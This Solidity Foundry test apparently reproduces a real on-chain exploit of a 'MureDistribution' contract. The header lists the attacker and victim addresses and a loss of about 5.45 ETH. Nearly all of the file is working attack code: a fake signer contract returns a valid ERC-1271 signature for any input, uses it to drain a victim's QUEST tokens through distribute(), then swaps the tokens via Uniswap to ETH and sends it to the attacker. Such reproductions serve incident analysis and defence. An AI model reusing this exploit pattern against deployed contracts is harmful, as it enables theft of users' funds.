// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~5.45 ETH
// Attacker : https://etherscan.io/address/0x08096e9ae70d7c5f2707b203a7801b75d1412156
// Attack Contract : https://etherscan.io/address/0x2b896760f8ad2ecf58ef93bdf71ac5e85c2b7f63
// Vulnerable Contract : https://etherscan.io/address/0x365083717efb17f3895290ba38f20f568c7a4d8a
// Attack Tx : https://etherscan.io/tx/0xb83040361a0ec72fa2d06ad69493226518a5f8b5d96c19b400626248f9c5b798
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x365083717efb17f3895290ba38f20f568c7a4d8a#code
//
// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/DefimonAlerts/status/2058211424761942226

contract MureDistributionTest is Test {
    bytes32 internal constant TX_HASH = 0xb83040361a0ec72fa2d06ad69493226518a5f8b5d96c19b400626248f9c5b798;
    uint256 internal constant FORK_BLOCK = 25_141_106;
    uint256 internal constant TX_TIMESTAMP = 1_779_336_287;
    address internal constant ATTACKER = 0x08096e9ae70D7C5F2707b203A7801b75d1412156;
    address internal constant VICTIM = 0x29b0a315924E05aC0c898a63D96daA33CfD1cAc7;
    address internal constant MURE_DISTRIBUTION = 0x365083717eFB17F3895290BA38f20F568C7A4D8a;
    IERC20 internal constant QUEST = IERC20(0x1Fc122FE8b6Fa6b8598799baF687539b5D3B2783);

    uint256 internal constant DRAINED_QUEST = 4_848_683_803_036;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.warp(TX_TIMESTAMP);
        vm.deal(ATTACKER, 0);

        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");
        vm.label(MURE_DISTRIBUTION, "MureDistribution Proxy");
        vm.label(address(QUEST), "QUEST");
    }

    function testExploit() public {
        uint256 beforeEth = ATTACKER.balance;
        uint256 beforeVictimQuest = QUEST.balanceOf(VICTIM);

        vm.prank(ATTACKER, ATTACKER);
        new MureDistributionExploit(ATTACKER);

        uint256 stolenQuest = beforeVictimQuest - QUEST.balanceOf(VICTIM);
        uint256 ethProfit = ATTACKER.balance - beforeEth;

        assertEq(stolenQuest, DRAINED_QUEST, "QUEST drain mismatch");
        assertGt(ethProfit, 5 ether, "ETH profit too low");

        console.log("Stolen QUEST", stolenQuest);
        console.log("Profit ETH", ethProfit);
    }
}

contract MureDistributionExploit {
    constructor(address attacker) payable {
        MureSignerSource source = new MureSignerSource(address(this));
        source.attack();

        (bool ok,) = attacker.call{value: address(this).balance}("");
        require(ok, "eth transfer failed");
    }

    receive() external payable {}
}

contract MureSignerSource {
    bytes4 internal constant ERC1271_MAGIC_VALUE = 0x1626ba7e;
    bytes4 internal constant ERC165_INTERFACE_ID = 0x01ffc9a7;
    bytes4 internal constant MURE_POOL_INTERFACE_ID = 0x10704b42;

    address internal constant VICTIM = 0x29b0a315924E05aC0c898a63D96daA33CfD1cAc7;
    IMureDistribution internal constant MURE_DISTRIBUTION = IMureDistribution(0x365083717eFB17F3895290BA38f20F568C7A4D8a);
    IUniswapV3Router internal constant UNISWAP_V3_ROUTER = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 internal constant QUEST = IERC20(0x1Fc122FE8b6Fa6b8598799baF687539b5D3B2783);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint24 internal constant QUEST_USDC_FEE = 10_000;
    uint24 internal constant USDC_WETH_FEE = 500;
    uint256 internal constant DRAINED_QUEST = 4_848_683_803_036;

    address internal immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");

        MURE_DISTRIBUTION.distribute(
            IMureDistribution.Distribution({
                token: address(QUEST),
                source: address(this),
                from: VICTIM,
                to: address(this),
                poolId: "quest",
                amount: DRAINED_QUEST,
                deadline: block.timestamp + 1
            }),
            address(this),
            ""
        );

        require(QUEST.approve(address(UNISWAP_V3_ROUTER), type(uint256).max), "QUEST approve failed");
        uint256 wethOut = UNISWAP_V3_ROUTER.exactInput(
            IUniswapV3Router.ExactInputParams({
                path: abi.encodePacked(address(QUEST), QUEST_USDC_FEE, USDC, USDC_WETH_FEE, address(WETH)),
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: QUEST.balanceOf(address(this)),
                amountOutMinimum: 1
            })
        );

        WETH.withdraw(wethOut);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "owner eth transfer failed");
    }

    function poolState(string calldata) external view returns (uint256, uint256, uint256, uint256, uint256, address, uint256, address){
        return (0, 0, 0, 0, 0, address(QUEST), 0, address(this));
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4){
        return ERC1271_MAGIC_VALUE;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == ERC165_INTERFACE_ID || interfaceId == MURE_POOL_INTERFACE_ID;
    }

    receive() external payable {}
}


interface IMureDistribution {
    struct Distribution {
        address token;
        address source;
        address from;
        address to;
        string poolId;
        uint256 amount;
        uint256 deadline;
    }

    function distribute(Distribution calldata distribution, address signer, bytes calldata signature) external;
}

interface IUniswapV3Router {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;
}